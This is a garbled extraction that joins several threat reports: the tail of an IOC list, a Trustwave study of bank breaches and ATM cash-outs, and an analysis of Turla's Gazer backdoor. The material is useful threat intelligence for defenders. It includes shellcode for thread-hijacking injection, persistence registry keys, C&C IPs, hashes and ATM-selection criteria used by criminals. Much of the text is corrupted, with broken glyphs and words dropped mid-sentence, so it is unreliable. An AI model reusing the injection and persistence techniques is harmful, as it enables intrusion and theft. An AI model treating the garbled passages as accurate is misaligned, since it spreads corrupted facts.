e\n-\nIOCs.txt\n\nEmergingThreats\n:\n\nhttps://rules.emergingthreats.net/changelogs/suricata\n-\n1.3.etpro.2015\n-\n09\n-\n10T21:29:38.txt\n\n(cached by other sites, search for hash 4d3874480110ba537b3839cb8b416b50 and \nEXEProxy\n)\n\nPalo Alto Networks:\n\nhttps://researchcenter.paloaltonetworks.com/2015/07/apt\n-\ngroup\n-\nups\n-\ntargets\n-\nus\n-\ngovernment\n-\nwith\n-\nhacking\n-\nteam\n-\nflash\n-\nexploit/\n\nhttps://researchcenter.paloaltonetworks.com/2015/07/ups\n-\nobservations\n-\non\n-\ncve\n-\n2015\n-\n3113\n-\nprior\n-\nzero\n-\ndays\n-\nand\n-\nthe\n-\npirpi\n-\npayload/\n ", "A TRUSTWAVE SPIDERLABS ADVANCED THREAT REPORT\n \n \n \nPost-Soviet Bank Heists:\nA Hybrid Cybercrime Study\n Table of Contents\nIntroduction\n \n............................................................\n.\n1           \nA Closer look\n............................................................\n2\nDetailed walkthrough\n \n.................................................\n3\nMalicious Code\n.......................................................\n5\nRecommendations\n \n......................................................\n7\nIndicators of Compromise\n................................................\n8\nFiles\n.................................................................\n8\nIPs/Domains\n \n.........................................................\n8\n \nAuthors\n  \nThanassis Diogos\n \nEMEA Managing Consultant, Incident Response, Trustwave\n \n  \nSachin Deodhar\n \nEMEA Incident Response Consultant, Trustwave\n \nResearch and Publication\n  \nRodel Mendrez and Gerald Carsula\n \nMalware Research Team, Trustwave\nPost-Soviet Bank Heists:\nA Hybrid Cybercrime Study\n \n \n 1\nIntroduction\nEarlier this year, the SpiderLabs team at Trustwave investigated a series of bank breaches originating from post-\nSoviet states. These investigations took place during mid-to-late 2017, and each bank compromise resulted in a \nsigni\u02dccant amount of stolen funds. The actual amount of money stolen was different in each case, with the average \namount around USD$5 million (in cash), ranging from USD$3 to USD$10 million. The investigations showed that \nthe attacks shared a number of common features, such as involving large amount of monetary loss originating from \nwhat initially appeared to be legitimate bank customer accounts. Additionally, in all cases, the theft took place using \nnormal cash withdrawals from various ATM terminal locations outside the bank\u2122s originating country. \nIn some cases, the victim banks didn\u2122t even realize that a breach had taken place and a signi\u02dccant amount of money \nwas stolen until well after the attack was completed. In a few cases, the malicious activity was reported to the banks \nby third-party processors responsible for processing the bank\u2122s debit and credit card transactions. The common \nfeature between these cases is that money was stolen using legitimate ATM cards provided by each bank. \nCriminals used (or hired) people to personally visit the various branches and request new accounts with minimum or \nzero initial deposit amounts. Beyond opening their \ufb01personal\u2122 accounts, they also demanded to receive a debit card \nwith their new account. Initially this might not appear to be an issue since debit card usage is directly related to the \naccount\u2122s balance. However, in the banking world, a service called \ufb01Overdraft\ufb02 exists; simply put it means that under \nvery speci\u02dcc circumstances a debit card can be converted into a credit card. This means that the bank allows their \ncustomer to withdraw cash even though they do not have the appropriate balance in their account. Of course, this is \nsupposed to happen only for speci\u02dcc account types, also referred to as risk levels. \nAfter the debit cards were delivered to the customers, they were distributed outside the originating country to a \ngroup of international conspirators. When all the cards had been relocated to their destination countries, a cyber-\ncriminal, who had already breached the victim bank network, accessed the bank\u2122s internal systems and manipulated \nthe debit cards\u2122 features to enable a high overdraft level and removed anti-fraud controls that had been placed for \nthe speci\u02dcc accounts. Minutes later the operation continued in the countries where the debit cards had travelled. \nThe debit cards were used to perform cash withdrawals from several different ATMs. Within the next few hours the \noperation concluded, removing up to USD$10 million from each bank.\nWe believe that the attack described in this report represents a clear and imminent threat to \u02dcnancial institutions in \nEuropean, North American, Asian and Australian regions within the next year. Currently the attacks are localized to \nthe Eastern European and Russian regions. However, in cybercrime, this area is often the canary in the mineshaft \nfor upcoming threats to other parts of the world. Our investigations have revealed victim losses currently around \napproximately USD$40 million.  However, when taking into account the undiscovered or uninvestigated attacks \nalong with investigations undertaken by internal groups or third parties, we estimate losses to be in the hundreds of \nmillions in USD. All global \u02dcnancial institutions should consider this threat seriously and take steps to mitigate it.\n 2\nA Closer Look \nTo drill into the details of these criminal operations we will take a closer look at one of the cases. On a winter evening \nin February 2017, a credit/debit card processor\u2122s fraud management system picked up a series of suspicious ATM \nwithdrawal transactions originating from the victim bank\u2122s customer accounts during the late-night hours until the \nearly morning. The withdrawals occurred at ATM terminals located across the region, including Europe and the \nRussian Federation. Notably, no ATM transactions occurred in countries where the affected bank had a presence. \nIn addition to requesting the Trustwave SpiderLabs team to perform a thorough investigation, the bank also reported \nthis incident to local law enforcement agencies. Undoubtedly this incident appeared to be multifaceted; it appeared \nthat the bank\u2122s network was breached, and it also seemed likely that the processor\u2122s network may have also been \ncompromised. Moreover, it was also likely that there was a physical facet to this breach, in which an organized \ncybercriminal network was involved. The Trustwave team\u2122s objective was to investigate the incident based purely on \navailable factual evidence and its unbiased interpretation. \nThe third-party processor engaged an independent team from Trustwave SpiderLabs to investigate the impact \nof the incident on its network and its overall business. This way Trustwave could see the whole picture from the \nperspectives of both the affected bank and the third-party processor, whose services the bank used for its card \nprocessing functions. \nThe Trustwave team commenced both sides of the investigation immediately and was able to successfully uncover \nwhat we believe to be a very interesting, if not entirely unique, modus operandi behind the successful breaches of \nboth the bank and processor networks. The objective of such an operation is the successful withdrawal of funds \nfrom the rogue accounts created earlier, as described in this report. \nThe attackers used innovative attack tactics, techniques and procedures to successfully execute a long duration \n\ufb01hybrid\ufb02 attack campaign comprising two physical stages and multiple cyber-attack stages as depicted below:\n \nSTAGES OF THE ATTACK\n \n\u02dc\u02da\u02db\n\u02dc\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\u02da\u02dd\n\n\u02dc\u02da\u02db\n\u201c\n\n\n 3\nDetailed Walkthrough\nOur \u02dcndings suggest that motivation for the attack was purely \u02dcnancial gain. Our analysis shows that the cyber \nattackers and their physical counterparts worked in close and very effective coordination to execute this malicious \noperation:\n\u0141\n \nThe cybercriminal network behind this attack recruited so-called \ufb01mules\ufb02, (non-technical conspirators whose \njob is to transfer money for cybercriminals), to open dozens of new bank accounts by physically visiting various \nbranches of this bank in different cities in the country. These individuals used counterfeit documents to request \nbank accounts, most likely supplied by the organized cybercriminal network. Once these people had new bank \naccounts approved, they then requested debit/ATM card companions to their new bank accounts. After they \nobtained these debit cards, they probably handed these debit cards over to a member of the cybercriminal \nnetwork for distribution outside the country for later use.\n \nPHYSICAL PART OF THE ATTACK\n\u0141\n \nWhile the physical activities involving application for accounts and debit cards were taking place at the bank\u2122s \nvarious branches in the country, the cyber attackers gained initial entry, moved laterally and compromised \nmultiple systems inside the bank\u2122s network.\n \nGAINING INITIAL FOOTHOLD IN THE BANK NETWORK\n\u0141\n \nAfter successfully compromising the bank\u2122s network the cyber attackers then proceeded to launch an attack on \nthe third-party processor\u2122s network and eventually (after numerous attempts) they succeeded. The bank, due \nto their established cooperation with the processor, already maintained connectivity with the processor. This \nmade it easier for the criminals because they had already gained access to the bank\u2122s infrastructure and had \ncaptured the credentials used to connect to the processor. After gaining foothold into the processor\u2122s network, \nthe attackers compromised the Enterprise Admin account which eventually gave them full access into the \ninfrastructure. Their next step was to execute reconnaissance of the card processing service. \n \n\u02dc\n\u02d8\n\n\n\n\u02dc\n\u02da\u02d8\u02db\u02dd\n\u02dc\n\n\n\n\n\n\n\u02dc\u02da\u02db\u02dd\u02d9\u02c6\u02c7\n\n\n\n\n\n\n\n\u02c6\n\n\n\u02c6\n\n\n\u02c6\n 4\nLATERAL MOVEMENT AND SUCCESSFUL COMPROMISE OF BANK NETWORK\n\u0141\n \nNext, the attackers executed several malicious payloads on the processor\u2122s network, key amongst them was \na legitimate monitoring tool installed on the processor\u2122s Terminal Server (that allowed users to access the card \nmanagement application via a browser). This software called \ufb01Mipko\ufb02 (advertised as \ufb01Employee Monitor\ufb02) \ncaptures full information, including screen captures, keystrokes and several other types of information for all \nusers who logged into the system and/or accessed the card management application using their respective \ncredentials. In this way the software attackers captured almost 4GB of data within a month. The information \ncaptured included keystroke logging and countless screenshots. \n \nINSTALLATION OF KEYLOGGER AND COMPROMISE OF THE PROCESSOR NETWORK\n\u0141\n \nThe attackers then identi\u02dced the accounts on the card management application used by the bank employees \nwho had authorization to \ufb01request\ufb02 changes to the properties of a customer\u2122s debit card, and \ufb01approve\ufb02 or \n\ufb01commit\ufb02 such a change. They were looking for such privileges to manipulate each of the cards associated with \nthe rogue accounts created during the preceding months. \n\u0141\n \nDuring the day of the \u02dcnal stage attackers used these credentials to: \n\u0141\n \nChange risk ratings on the rogue accounts from high to low allowing the attackers to activate further credit \npermission, known as Overdraft (or simply OD). \n\u0141\n \nActivate the OD credit function on the accounts. \n\u0141\n \nManipulate or remove any anti-fraud control in place for these accounts.\n\u0141\n \nChange the OD Limit on the accounts from the default value of USD$0 to ranges of USD$25,000 - USD$35,000.\n\u0141\n \nThe physical counterparts stationed at various locations in Europe and the Russian Federation then cashed out \nsubstantial amounts of money for each of these cards from ATM terminals. Cash withdrawals across the region \nbegan within minutes of the \u02dcrst OD property change made to the debit cards on the card management application. \n\u02dc\u02da\u02db\u02da\u02dd\n\n\n\n\u02db\n\n\n\u02da\n\n\n\u02dc\u02da\u02db\u02db\u02dd\u02d9\u02c6\u02c7\n\n\u02d8\u02db\n\n\u02d9\n\n\n\n\u02dc\u02da\u02db\u02db\u02dd\u02d9\u02c6\u02c7\n\u02dd\u02d9\u02d8\u02c6\n\n\u02c7\u02d8\n\n\u02c7\u02d8\n 5\nCOORDINATED ATM CASH WITHDRAWALS ~ MILLIONS OF USD\nAs in the preceding phases of the attack, careful planning went into the choice of ATM locations to be used for cash \nwithdrawals, based on the following criteria:\n1.\n \nLocation: those in solitary locations took precedence over those in locations with higher foot traf\u02dcc.\n2.\n \nDegree of physical security: ATMs with no security cameras (or those with defective security cameras) were \nchosen as well as terminals that were not protected by security guards.\n3.\n \nThe ability to dispense substantial amounts of cash. ATMs (mis) con\u02dcgured to allow withdrawal of substantial \namounts of money were chosen. (Speci\u02dccally, either very high or no daily withdrawal limits were selected).\n4.\n \nATM locations were chosen in cities across Europe, (including former Soviet Union countries), and the Russian \nFederation. No selected ATM was located in the victim bank\u2122s actual country. \nThe \u02dcnal stage of this hybrid operation took almost \u02dcve hours to complete. This was the time required for each \nrogue account to be carefully manipulated and for simultaneous debit card withdrawals across the geographic \nregion to occur. As in the \u02dcrst phase of the operation where the mules played an active role in requesting the new \naccounts and debit cards, in the \u02dcnal phase the mules were employed to perform the cash withdrawals. Only a small \nnumber of the ATMs were equipped with security cameras, so a few mules were caught in action. Law enforcement \nrequested video footage from surrounding buildings\u2122 cameras and this revealed that the mules met with other \nsuspects (probably direct members in the cybercrime gang) shortly after cashing out the debit cards. These \nmeetings were most likely to deliver the stolen cash, after keeping their fee. \nMalicious Code\nThroughout the distinct phases of the cyber-attack, we noted that attackers adopted the emerging tactic sometimes \ncalled \ufb01living off the land\ufb02 which involves very limited use of actual malware in the form of malicious \u02dcles and easily \ndetected protocols associated with Command & Control and data ex\u02dcltration traf\u02dcc. Instead, the attackers used \nlegitimate Windows and PowerShell commands in combination with tools such as PSExec for lateral movement. \nNotably they also used plink.exe (Windows SSH client) to access RDP over an already established SSH tunnel. \nOther software components used in this operation were split among commercial monitoring application (Mipko \nEmployee Monitor) and the well-known suspect \ufb01Cobalt Strike Beacon\ufb02 mainly used to maintain backdoor \nconnection with an endpoint geolocated in the United States of America. \nIt should be noted that after the attackers penetrated the bank\u2122s network, they continually used a speci\u02dcc system \nto perform their activities. We focused our investigation on this system after backtracking malicious activities in the \nprocessor\u2122s network to it. Remote Desktop activity on the processor network was identi\u02dced to have originated from \nthe bank system. Eventually we asked the bank to provide this system for investigation. At that point, the bank\u2122s IT \nstaff responded that this system became unbootable shortly after the massive cash out occurred. \n\u02dc\u02da\u02db\u02db\u02dd\u02d9\u02c6\u02c7\u02d8\n\n\n\n\u02dd\n\n\n 6\nWhen we obtained a copy of the system for analysis we found it was unbootable and the \u02dcle system was corrupt. \nHowever, the Trustwave team was able to reconstruct the partition table and analyze the \u02dcle system enabling \ncollection and analysis of signi\u02dccant evidence from this key system. One of them was called dropper.exe and \nupon execution its main function was to wipe the Master Boot Record on the hard disk, effectively destroying the \nsystem for any future use. This was the last recorded action taken by the attackers before leaving the network. They \nappeared to truly care about clearing any remaining tracks of their activity that may have been left behind. \nOur investigation did not reveal any signs of data ex\u02dcltration from the bank itself. The bank\u2122s network appears to \nhave been breached for two primary reasons: \n1.\n \nThe bank had an established mechanism to connect to the processor\u2122s network from several terminals inside \nthe bank network by \u02dcrst establishing a VPN session between the two networks and then using Remote Desktop \nProtocol (RDP) to connect from a system inside the bank network to the Windows Terminal Server in the \nprocessor\u2122s network. By attacking the bank\u2122s network, the attackers could piggy back on this connection to get a \nfoothold on the processor\u2122s network (and subsequently obtain access to the card management application in the \nprocessor\u2122s network)\n2.\n \nTo withdraw funds from the newly issued debit cards for the \ufb01rogue\ufb02 bank accounts, the attackers needed \nto obtain credentials of the bank employees that used the card management application on the processor\u2122s \nnetwork. Using these credentials, they could change the necessary properties of the debit cards to cash out from \nATM terminals in the \u02dcnal stage of the attack. \nBased entirely on the precision with which the attack was carried out, we believe that the attackers had previously \nobtained deep inside knowledge of the bank\u2122s network and systems. Similarly, they obtained an understanding \nof the processor\u2122s environment, and of the card management software and how these systems could be used \nto manipulate a debit card\u2122s sensitive properties such as its overdraft (OD) limit and its Risk Rating. These two \nparameters are needed to determine the account\u2122s OD limit and therefore how much money the account holder can \nwithdraw. \nIt should also be noted that the attacker\u2122s tradecraft suggests involvement of organized cybercrime groups; for \nexample, the attackers successfully wiped the Master Boot Record (MBR) of the hard disk attached to the main \nWindows system used in this attack. They used specialized malware intending to thwart any future forensic \nexamination of the system. \nIt goes without saying that the adverse negative impact of this incident was felt by both the bank and the processor:\n\u0141\n \nThe direct dollar value of the loss incurred by the bank pales in comparison with the harder to quantify intangible \nlosses suffered because of loss of trust and goodwill with its customers, partners and regulators. Also, the bank \ncustomers\u2122 money remained intact as the debit cards that were used for ATM withdrawals were issued against \nthe newly created rogue accounts, none of which had any balance since they were set up. \n\u0141\n \nIn the case of the processor, while no direct monetary loss was incurred, the processor likely lost much more in \nterms of erosion of trust in their services both with the regulators and their clients (other banks). \n \n\u02dc\u02da\u02db\n\n\n\n\n\n\n\n\n\u02dc\n\u02db\n\u02c7\u02dd\u02d9\u02c6\n\n 7\nRecommendations\n\u0141\n \nBanks are advised to prepare a well-documented and tested Incident Response Plan (IRP) so they are better \nprepared to deal with such incidents swiftly and effectively.\n\u0141\n \nIn addition to implementing an effective (but inherently reactive) IR Plan, banks are also advised to consider \nsetting up a proactive program for Managed Detection & Response (MDR), also known as threat hunting, which \nwould allow banks to detect threats early on, and mitigate them before they have a chance to realize their full \npotential. \n\u0141\n \nThe success of these cyber-attacks may be attributed to failures in both technical and non-technical controls, for \nexample, the lack of coupling between the Core Banking System and the Third-Party Card Management System. \nHad these systems been integrated properly, it would have been much simpler for the changes to the debit card \nproperties to be red-\u02daagged and blocked by the bank prior to successful monetary theft. Another example of \na non-technical control failure is that several accounts on the Card Management System were allowed to both \n\ufb01raise a request\ufb02 for a change to be made, and to \ufb01approve\ufb02 such a change. This is in clear violation of the \nvery commonly used type of control in banks and banking applications called Maker-Checker control (or the \n4-eye principle). Therefore, banks are advised to undertake not only a proactive cyber security risk assessment \nexercise, but also to undertake a holistic \ufb01business process\ufb02 risk management exercise to detect and mitigate \nthese types of control weaknesses. \n\u0141\n \nFrom a technical standpoint, success of these cyber-attacks may be attributed to the following reasons:\n\u0141\n \nFirst, the attackers were able to successfully spear phish and socially engineer bank employees to get an initial \nfoothold in their networks.\n\u0141\n \nSecond, the attackers took advantage of the common approach of setting the same password for \ufb01Local \nAdministrator\ufb02 accounts for all the systems in the Windows network, and the tendency of the systems \nadministrators to use the \ufb01Domain Administrator\ufb02 account (over the network) to perform routine tasks, to \ncompromise other systems in the Windows network and eventually obtain the \ufb01Domain Admin\ufb02 credentials. \nFor these reasons, we recommend:\n\u0141\n \nA different approach (e.g. Windows LAPS) to managing Local Administrator account credentials for the systems \nin their Windows networks.\n\u0141\n \nRestrict by policy the use of the Domain Admin account over the network unless absolutely necessary.\n 8\nIndicators of Compromise\nFILES\nTable 1:\n \n Indicators of Compromise (Files)\nFile name\nSHA256 Hash (malicious Files only)\nType\nplink.exe\n5A21A83DFB5822301896A696F3A1A3E8207BF541E11CD1F2BBB7BC666251D8C7\nLegitimate tool but \nmalicious usage\nnetscan.exe\n5748BFB17E662FB6D197886A69DF47F1071052C3381EB1C609A2BC5DBA8C2992\nLegitimate tool but \nmalicious usage\ncrss.exe\nD845AF9B15052D49CBE67960AF2A9E51EEAD4D1E21A0DE5C372D4925BA8E1B62\nMalicious\nadobeArm.exe\nDAAB0E5CF3D968B4144B781793763CC6672B30FACC5AF061D0469D6DFFFDA967\nMalicious\ndropper.exe\nDF8948696BB8759EDE500A6A27CE788F1438D1A57F114709D7239865C728B22C\nMalicious\nservicePS1.txt\n589B49D72115A24A0F898E3A5165AFF13BE29EA4A6190977BD046B8657C0D994\nMalicious\nlor2.exe\n97A34BCECF276F9B0E16770D43CEBB2AA3A2FACB47081507DF44A961E932220D\nMalicious\njava.exe\nEED138E53A748EC82A99633BC19020AE6C1D0F609CE3D6555389FB34437EBC02\nMalicious\nsys64.dll\n8A80CA46C0C18CC9B93D5130293A527AA8A925179FAA46597DDD087CD5B1A49F\nMalicious\nmpk.exe\n1940C9C9BFBBD64BA7079178CB819E3253E7057EAA8BEA136A99C90C9436782E\n  \nLegitimate tool but \nmalicious usage\nmpkview.exe\n8086C8836EBEDE1E7FCF3DEBDC009B0982193DF684A55047237C2112DD376AEA\nLegitimate tool but \nmalicious usage\nIPS/DOMAINS\nTable 2: \n \nIndicators of Compromise (IPs/Domains)\nHost\nUsage\nGeo Location\n192.52.167.228\nC&C, Backdoor reverse connect IP\nUnited States\n192.52.167.28\nC&C, Backdoor reverse connect IP\nUnited States\n PSBH_1017\ntrustwave.com\nCopyright \u00a9 2017 Trustwave Holdings, Inc.\n ", "Gazing at Gazer\nTurla\u2122s new second stage backdoor\nAugust \u02dc\u02da\u02db\u02dd\n Gazing at Gazer\nTurla\u2122s new second stage backdoor\nAugust \u02dc\u02da\u02db\u02dd\n TABLE OF CON\nT\nEN\nT\nIntroduction\n \n\u02dc\nSummary\n \n\u02dc\n\nSimilarities with other Turla tools\n \n\u02da\nCustom encryption\n \n\u02da\nGlobal \nA\nrchitecture\n \n\u02db\nLoader\n \n\u02dc\nLogs\n \n\u02da\u02da\nWorking Directory\n \n\u02da\u02db\nOrchestrator\n \n\u02da\u02dd\nCommunication Module\n \n\u02da\u02d9\nMessages between components\n \n\u02da\u02c6\nGazer versions\n \n\u02dd\u02d9\nIoCs\n \n\u02dd\u02c6\nFilenames\n \n\u02c7\u02da\n\nRegistry keys\n \n\u02c7\u02da\nC&C URLs\n \n\u02c7\u02da\nMutexes\n \n\u02c7\u02da\n\nHashes\n \n\u02c7\u02c7\nA\nppendices\n \n\u02dd\u02dc\nFunction names\n \n\u02c7\u02d8\nYara rules\n \n LIST\n OF \nFIG\nURE\nS\nFigure \u02db.\n \nTurla author\u2122s sense of humor\n \n\u02d9\nFigure \u02dc.\n \nGazer architecture\n \n\u02dc\nFigure \u02d9.\n \nMessage format\n \n\u02da\u02c6\nFigure \u02c6.\n \nCere variants\n \nLIST\n OF TABLE\nS\nTable \u02db.\n \nAbstract Class Autorun\n \n\u02da\u02d8\nTable \u02dc.\n \nAbstract Class Queue\n \n\u02da\u02d9\nTable \u02d9.\n \nAbstract Class Storage\n \n\u02da\u02d9\nTable \u02c6.\n \nAbstract Class TListenerInterface\n \n\u02da\u02d9\nTable \u02c7.\n \nAbstract Class TAbstractTransport\n \n\u02da\u02d9\nTable \u02d8.\n \nGazer sample hashes\n \n\u02c7\u02c7\n \u02c7\nIN\nT\nRODU\nCTI\nON\nHerein we release our analysis of a previously undocumented backdoor that has been targeted \nagainst embassies and consulates around the world leads us to attribute it, \n\nto the Turla group. Turla is a notorious group that has been targeting governments, government \n\nor years. They are known to run \nwatering hole\n and spearphishing campaigns \n\nto better pinpoint their targets. Although this backdoor has been actively deployed since at least \n\n2016, it has not been documented anywhere. Based on strings found in the samples we analyzed, \n \n\nwe have named this backdoor \ufb01Gazer\ufb02.\nRecently, the Turla APT group has seen extensive news coverage surrounding its campaigns, \nsomething we haven\u2122t seen for a long time. \nThe Intercept\n reported that theresentation \n \nby Canada\u2122s Communication Security Establishment (CSE) outlining the errors made by the Turla \n\noperators during their operations even though the tools they use are quite advanced. The codename \n\nfor Turla APT group in this presentation is MAKERSMARK. Gazer is, similar to its siblings in the Turla \n\nfamily, using advanced methods to spy and persist on its targets. This whitepaper highlights \n \nthe campaigns in which Gazer was used and also contains a technical analysis of its functionalities.\nSUMMARY\nBased on our research and telemetrent campaigns where Gazer was used,we believe \n \nthat Southeastern Europe as well as countries in the former Soviet Union Republichas recently \n \nbeen the main target. The witnessed techniques, tactics and procedures (TTPs) are in-line with \n \nwhat we usuallysee in Turla\u2122, such as \nSkipper\n, likely delivered \nthrough spearphishingfollowed by the appearance on the compromised system of a second \n \nstage backdoor, Gazerin this case.\nAlthough wefutable evidence that this backdoor is truly another tool in Turla\u2122s \narsenal, several clues lead us to believe that this is indeed the case. First, their targets are in line \n \nwith Turla\u2122s traditional targets: Ministries of Foreign As) and embassies. Second, the modus \n \noperandi of spearphishing, follow stealthier backdoor \n\nis what has been seen over and over again. Skipper, which has been linked to Turla in the past, was \n\nfound alongside Gazer in most cases we investigated. Finally, there are many similarities between \n\nGazer and other second stage backdoors used by the Turla group such as \nCarbon\n and \nKazuar\n.\nAs usual, the Turla APT grt to avely, \n\nchanging the strings and randomizing what could be simple markers thrent backdoor \n\nversions. In the most recent version we have found,\n \n\nand inserted \ufb01video-game-related\ufb02 sentences throughout the code. An example of such \n \na string is depicted in \nFigur\n.\n \u02d8\n \nFigure \u02dc.\n \nTurla author\u2122s sense of humor\nS\nI\nM\nI\nLAR\nITI\nE\nS\n W\nIT\nH O\nT\nHER TURLA \nT\nOOL\nS\nGazer is written in C++ and shares several similarities with other malware from the Turla APT family. \n \nIndeed, Gazer, Carbon and Kazuar can receive encrypted tasks from a C&C\n \nserver, which can be executed \n \neither by the infected machine or by another machine on the network. They all use an encrypted \n\ncontainer to store the malware\u2122\n \n\nThe list of C&C\n \nservers is encrypted and embedded in Gazer\u2122s PE resources. They are all compromised, \nlegitimate websites (that mostly use the WordPryer proxy. This is also \n \n\na common tactic for the Turla APT group.\nAnother interesting linkage is that one of the C&C\n \nservers embedded in a Gazer sample was known \n \nto be used in a JScript backdoor documented by Kaspersky as \nKopiluak\n.\nLast but not least, these three malware families (Gazer, Carbon and Kazuar) have a similar list \n \nof processes that may be employed as a target to inject the module used to communicate with the \n\nC&ver embedded in the binary. The resource containing this list can change from one sample \n \n\nto another, it is likely tailored to what is installed on the system (for example, on some samples, \n \n\nthe process name \ufb01safari.exe\ufb02 can appear on the list).\nCU\nST\nOM EN\nC\nRYP\nTI\nON\nGazer\u2122s authors make extensive use of encryption. They don\u2122t use the Windows Crypto API \n \n\nand don\u2122t seem to use any public library. It looks as if they are using their own library \n \nf\nThe RSA keys embedded in the resources contains the attacker\u2122s public key which is used to encrypt \nthe data sent to the C&C\n \nserver, and a private key to decrypt resources embedded in its binaries. \n\nThese keys are unique in each sample.\nThese resources are structured in the same way as \nRSA from OpenSSL\n, but these values (p, q, etc.) \n \nare computed by the custom implementation of Gazer\u2122s authors.\n \u02dd\n the IV and a static key are hardcoded and are the same in all samples. \n \nis randomly generated and XORed with the static key. The random data used to XOR the static \n \n\nkey is pr. This key is then used in the r\nGLOBAL \nA\nR\nC\nH\nIT\nE\nCT\nURE\nIn this section, we will describe in detail each component of Gazer.\n\u02dc\u02da\u02dc\u02db\u02dd\u02d9\u02c6\u02c7\u02d9\u02c6\n\n\n\u02dc\u02da\u02dc\u02db\u02dd\u02d9\u02c6\u02d9\n\u02dc\u02da\u02db\u02dd\u02d9\u02c6\u02c7\u02da\u02c7\n\u02dc\u02da\u02dc\u02db\u02dd\u02d9\u02c6\u02c7\n\n\u02dc\u02da\u02dc\u02db\u02dd\u02d9\u02c6\u02d9\n\u02dc\u02da\u02db\u02dd\u02d9\u02c6\u02c7\u02da\u02c7\n\u02dc\u02da\u02dc\u02db\u02dd\u02d9\u02c6\u02c7\n\n\u02c6\n\n\u02dd\u02db\u02c6\n\n\n\n\u02c6\n \nFigure \u02da.\n \nGazer architecture\nLoader\ne to be executed on the system. Two resources \n \n\nare stored unencrypted in the binary:\n101: the process name to inject the orchestrator into\n\u02c7\n102: the orchestrator\nThe following mutex is created to ensure that only a single instance of the malware is running:\n\n{531511FA-190D-5D85-8A4A-279F2F592CC7}\nNamed pipe generation\nTo establish a communication channel between Gazer components, a named pipe is initiated.\n\nThe named pipe is generated from this string:\n\n\\\\\\\\.\\\\pipe\\\\Winsock2\\\\CatalogChangeListener-FFFF-F\n \nNote that in all samples we have analyzed the process name is \ufb01explorer.exe\ufb02\n The pattern \ufb01FFFF-F\ufb02 is replaced with values computed fr) of the current \nuser and the current timestamp.\nLet\u2122s take for example the current date as: \ufb012017/04/24\ufb02 and the SID: \n\ufb01S-1-5-21-84813077-\n3085987743-2510664113-1000\n\ufb02\n.\nTo generate the pattern at the end of the named pipe, some arithmetic is performed:\ntime = SystemTime.wDay * Systemtime.wMonth * SystemTime.wYear = \n24 * 04 * 2017 = 0x2f460\n\nx\nsid\n = (1 * 21 * 84813077 * 3085987743 * 2510664113 * 1000) & \n0xFFFFFFFF = 0xefa252d8\n((time >> 20) + (time & 0xFFF) + ((time >> 12) & 0xFFF)) % 0xFF = \n0x93\n\n((x\nsid\n >> 20) + (x\nsid\n & 0xFFF) + ((x\nsid\n >> 12) & 0xFFF)) % 0xFF = \n0x13\n((time * x\nsid\n >> 24) + (uint8_t)(time * x\nsid\n) + ((uint16_t)(time * \nx\nsid\n) >> 8) + (uint8_t)(time * x\nsid\n >> 16)) % 0xf) = 0xa\nIn this case, the named pipe will be:\n\\\\\\\\.\\\\pipe\\\\Winsock2\\\\CatalogChangeListener-9313-a\n\nIf the current user\u2122s SID cannot be retrieved, the named pipe \n\\\\\\\\.\\\\pipe\\\\\\Winsock2\\\\\nCatalogChangeListener-FFFE-D\n will be used by default.\nCode injection through thread hijacking\nA not-so-common trick is used in order to inject the orchestrator into a remote process. Indeed, \n \n\na running thread from the remote process is hijacked in order to run shellcode that will execute \n \n\nthe communication module entry point.\nThe whole module and shellcode are copied into the remote process;\nthe function \nZwQuerySystemInformation\n is used to retrieve the total number \n \nof the running threads in the targeted process;\nthe following operations are attempted on each of those threads:\n\nthe thread is suspended with the \nOpenThread/SuspendThread\n functions;\nthe thread context is retrieved using \nGetThreadContext\n;\nthe context\u2122s instruction pointer is sav\n \n(through \nSetThreadContext\n);\nthe thread is resumed using \nResumeThread\n.\nif one of the previous operations fails, the thread is resumed and the same actions \n \n\nare attempted on another thread.\n launcher:\n \npush\n \nrax\n \nsub\n \nrsp,\n \n38h\n \nmovabs\n \nrax,\n \n5D20092\n     \n; @ end of payload\n \nmov\n \nqword\n \nptr\n \nss:[rsp+28],\n \nrax\n  \n; lpThreadId\n \nmov\n \nqword\n \nptr\n \nss:[rsp+20],\n \n0\n  \n; dwCreationFlags\n \nxor\n \nr9d,\n \nr9d\n       \n; lpParameter\n \nmovabs\n \nr8,\n \n5D20046\n     \n; lpStartAddress => @payload\n \nxor\n \nedx,\n \nedx\n      \n \n \n; dwStackSize = 0\n \nxor\n \necx,\n \necx\n      \n \n \n; lpThreadAttributes = NULL\n \ncall\n \nqword\n \nptr\n \nds:[CreateThread]\n \nmovabs\n \nrax,\n \n90A7FACE90A7FACE\n  \n; replaced by the saved \n \n           \ninstruction pointer from \n \n           \nthread context ;)\n\n \nadd\n \nrsp,\n \n38h\n \nxchg\n \nqword\n \nptr\n \nss:[rsp],\n \nrax\n \nret\npayload:\n\n \nsub\n \nrsp,\n \n28\n \nmovabs\n \nr8,\n \n5D20096\n \nmov\n \nedx,\n \n1\n \nmovabs\n \nrcx,\n \n4000000000000000\n \ncall\n \nqword\n \nptr\n \nds:\n \n[DllEntryPoint]\n \nxor\n \necx,\n \necx\n \ncall\n \nExitThread\n \nint\n \n3\n \nxxxx;  @DllEntryPoint\n \nxxxx\n \n; @CreateThread\n \nxxxx; @ExitThread\n \nxxxx\n \nxxxx\n \nxxxx\n \nxxxx\n \n; TID\nThe shellcode is just a loader that will execute the module entry point in a new thread.\nPersistence\nThe loader sends binary data through the named pipe to the orchestrator. This blob contains:\nCMC_TAKE_LOADER_BODY\nthe loader PE\nOnce this message is received by the orchestrator, the loader is securely deleted by overwriting \n \nough the DeleteFile function.\nAfterwards, the persistency is set up. The persistency information is retrieved from the resource \nand stored in the Gazer storage. Among these data, there is a \ndword\n value that is used to choose \nwhich persistency mode will be applied.\nThe resource 105 is structured in the following way:\na \ndword\n value representing the persistence mode\na \ndword\n value representing the size of the data\nthe persistence information\n \u02db\u02da\nThere arent persistence modes.\n\u02dc: ShellAutorun\nPersistence is achieved through the Windows registry by setting the value \ufb01Shell\ufb02 with \n\ufb01explorer.\n under the following key:\nHKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\n\u02da: HiddenTaskAutorun\nIt is very similar to the \ufb01TaskScheduler Autorun (4)\ufb02 method described below. ence \n \nis that the task is hidden from the user by using the \nTASK_FLAG_HIDDEN\n \n \nthe \nSetFlags\n method from the \nITask\n interface).\n\u02db: ScreenSaverAutorun\nIn this mode, Gazer achieves persistency by setting up in the Windows registry the executable \n \nor the screensaver.\nMany values are created under the \nHKCU\\Control Panel\\Desktop\n registry key:\nSCRNSAVE.exe\n with the malware executable 